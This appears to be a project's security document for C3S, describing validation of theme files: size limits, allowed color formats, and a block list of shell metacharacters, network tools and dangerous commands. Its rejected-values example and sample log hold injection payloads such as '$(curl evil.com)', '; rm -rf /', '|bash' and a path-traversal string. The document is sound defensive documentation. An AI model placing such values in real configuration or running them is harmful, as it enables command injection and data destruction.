# Security

## Theme File Security

C3S loads theme/skin files from `~/.config/c3s/skins/`. To prevent security vulnerabilities, we implement strict validation on theme file content.

### Security Measures

#### 1. File Size Validation
- **Limit:** Maximum 100KB per theme file
- **Reason:** Prevents DoS attacks via excessively large files
- **Behavior:** Falls back to default theme if file exceeds limit

#### 2. Color Value Validation
Theme files must contain only valid color values. We validate against:

**Allowed Formats:**
- Hex colors: `#RRGGBB` or `#RGB` (e.g., `#ff0000`, `#f00`)
- Named colors: lowercase letters and hyphens (e.g., `white`, `light-blue`)
- Aliases: `*name` format (e.g., `*primary-color`)
- Default: `default` keyword

**Blocked Patterns:**
- Shell metacharacters: `|`, `&`, `;`, `$`, `` ` ``, `<`, `>`, `(`, `)`, `{`, `}`, `[`, `]`, `!`, `~`
- Command keywords: `exec`, `eval`, `system`, `bash`, `sh`, `zsh`
- Path traversal: `../`, `~/`, `/bin`, `/usr`, `/etc`
- Network tools: `curl`, `wget`, `nc`, `netcat`
- Dangerous commands: `rm`, `chmod`

#### 3. Input Sanitization
- Empty values are rejected
- All color values are validated before processing
- Invalid values trigger a warning and are ignored (default value kept)
- Case-insensitive pattern matching for command detection

### Examples

#### ✅ Safe Theme Values
```yaml
k9s:
  body:
    fgColor: "#ffffff"           # Valid hex color
    bgColor: "black"             # Valid named color
  frame:
    title:
      fgColor: "*primary"        # Valid alias
      bgColor: "default"         # Valid keyword
```

#### ❌ Unsafe Theme Values (Will be Rejected)
```yaml
k9s:
  body:
    fgColor: "$(curl evil.com)"  # Command injection attempt
    bgColor: "#fff; rm -rf /"    # Shell command injection
  frame:
    title:
      fgColor: "../../etc/passwd" # Path traversal attempt
      bgColor: "|bash"            # Pipe to shell
```

### Logging
When unsafe values are detected:
```
WARN: Unsafe color value detected: '$(curl evil.com)', ignoring
WARN: Theme file too large (150000 bytes), using default theme
```

### Best Practices

1. **Only use trusted theme files**
   - Download themes from official k9s theme repositories
   - Review theme files before using them
   - Be cautious of themes from unknown sources

2. **File permissions**
   - Set appropriate permissions on `~/.config/c3s/skins/`
   - Recommended: `chmod 755 ~/.config/c3s/skins/`

3. **Review custom themes**
   - If creating custom themes, stick to valid color formats
   - Test themes in a safe environment first

### Reporting Security Issues

If you discover a security vulnerability in C3S:
1. **DO NOT** create a public GitHub issue
2. Contact the maintainers privately
3. Include details of the vulnerability and steps to reproduce

### Security Checklist

- [x] Theme file size validation (100KB limit)
- [x] Color value format validation
- [x] Shell command injection prevention
- [x] Path traversal prevention
- [x] Metacharacter filtering
- [x] Dangerous command keyword blocking
- [x] Warning logs for rejected values
- [x] Fallback to safe defaults
- [x] Comprehensive security tests

### References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
